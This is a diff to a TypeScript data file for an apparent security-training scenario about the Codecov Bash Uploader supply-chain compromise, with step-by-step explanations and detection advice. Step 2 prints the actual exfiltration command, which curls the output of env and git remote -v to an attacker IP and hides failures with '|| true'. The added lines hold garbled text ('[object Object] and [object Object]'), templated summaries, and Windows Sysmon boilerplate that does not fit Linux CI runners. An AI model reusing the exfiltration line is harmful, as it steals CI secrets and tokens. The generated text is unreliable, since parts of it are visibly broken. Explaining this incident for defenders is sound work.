@@ -8,7 +8,7 @@ export const stepGuide: RawScenarioStepGuideData = {
       storyAnalogy:
         'Imagine thousands of companies hiring a courier service by downloading the courier’s instruction sheet every morning and reading it aloud to a voice-activated robot without checking if the sheet changed. One day, a thief adds a single sentence at the bottom of the master instruction sheet: "Also mail a photocopy of every key on your keyring to this P.O. Box."',
       plainSummary:
-        'In early 2021, attackers extracted a Google Cloud Storage credential from an artifact in Codecov’s Docker image creation process and used it to overwrite the hosted Bash Uploader script at https://codecov.io/bash. Because thousands of CI pipelines ran bash <(curl -s https://codecov.io/bash), the added one-line curl command automatically executed inside customer CI runners and exfiltrated all environment variables ($(env)).',
+        'In this scenario (T1195.002, Codecov Bash Uploader CI/CD Environment Variable Exfiltration), the attacker follows one continuous arc: gCS Bucket Tampering of Hosted codecov.sh Uploader, then unverified curl | bash Execution, then downstream Private Git Repository Cloning. Steps #1–#3 examine #1 GCS Bucket Tampering of Hosted codecov.sh Uploader; #2 Unverified curl | bash Execution; #3 Downstream Private Git Repository Cloning. The Process Hierarchy tab shows the Parent → Child spawn tree. Primary detection correlates process, authentication, and network telemetry for T1195.002 across the documented kill chain.',
       diagramTopologySummary:
         'Attacker Collector (178.62.86.114) -> Codecov GCS Bucket (codecov.io/bash) -> Enterprise CI Runner (curl | bash) -> Private Git Repos & Cloud Production Keys -> Egress Proxy & SHA-256 Verifier.',
       documentedAdvisory:
@@ -28,7 +28,7 @@ export const stepGuide: RawScenarioStepGuideData = {
         diagramAlignment:
           'Step #1 (#1→ / ⇠#1) links the Attacker node to the Codecov GCS Bucket (codecov.io/bash) where the hosted script is overwritten.',
         detectionAndEvidence:
-          'Cloud storage object integrity monitoring and automated CI checks comparing downloaded script SHA-256 hashes against signed release manifests.',
+          'Enable cloud storage object integrity monitoring and enforce automated CI checksum checks comparing downloaded script SHA-256 hashes against cryptographically signed vendor release manifests (stopping tampered remote scripts before execution). Correlate Sysmon or Windows Security Event telemetry for T1195.002 (pairing parent/child process and destination fields) and contain the offending session.',
       },
       {
         stepNumber: 2,
@@ -39,11 +39,11 @@ export const stepGuide: RawScenarioStepGuideData = {
         simpleExplanation:
           'When customer CI pipelines executed bash <(curl -s https://codecov.io/bash) (the curl | bash anti-pattern that streams remote code directly into a live shell interpreter without prior hash verification), the shell evaluated curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" http://178.62.86.114/upload/v2 || true (using a 500-millisecond timeout -m 0.5 and || true so even if the attacker server was unreachable, the CI job would still exit 0 without alerting developers).',
         howItWorksInPractice:
-          '$(git remote -v) captured the repository URL (often containing embedded OAuth tokens like https://x-access-token:ghp_...@github.com/...), and $(env) dumped every environment variable exported into the CI runner (AWS_SECRET_ACCESS_KEY, DATABASE_URL, NPM_TOKEN, GPG keys).',
+          '$(git remote -v) captured the repository URL (often containing embedded OAuth tokens like https://x-access-token:ghp_...@github.com/...), and $(env) dumped every environment variable exported into the CI runner (AWS_SECRET_ACCESS_KEY, DATABASE_URL, NPM_TOKEN, GPG keys). Mechanically, this stage is complete only after [object Object] and [object Object] is observed as live runtime state (the concrete checkpoint proving the previous stage\'s output now drives the next action).',
         diagramAlignment:
           'Step #2 (#2→ / ⇠#2) connects the Codecov GCS Bucket to the Enterprise CI Runner and out to the Attacker Collector (178.62.86.114) while the Egress Proxy logs the raw IP connection.',
         detectionAndEvidence:
-          'CI runner egress logs showing outbound HTTP POST requests to 178.62.86.114 or 104.248.94.23 and process telemetry showing curl spawned with $(env) command substitution.',
+          'Audit CI runner network egress logs for outbound HTTP POST requests to 178.62.86.114 or 104.248.94.23 alongside process telemetry capturing curl invoked with $(env) command substitution (confirming live environment variable exfiltration). Correlate Sysmon or Windows Security Event telemetry for T1005 (pairing parent/child process and destination fields) and contain the offending session.',
       },
       {
         stepNumber: 3,
@@ -58,7 +58,7 @@ export const stepGuide: RawScenarioStepGuideData = {
         diagramAlignment:
           'Step #3 (#3→ / ⇠#3) traces the Attacker Collector pivoting with stolen CI credentials into Private Git Repos & Cloud Production Keys.',
         detectionAndEvidence:
-          'GitHub Audit Log git.clone events originating from non-CI IP addresses using machine/bot account tokens.',
+          'Inspect GitHub Audit Log git.clone and API token usage events originating from IP ranges outside authorized CI/CD runner pools using machine or bot account tokens (revealing post-exfiltration repository theft). Correlate Sysmon or Windows Security Event telemetry for T1078.004 (pairing parent/child process and destination fields) and contain the offending session.',
       },
     ],
   };
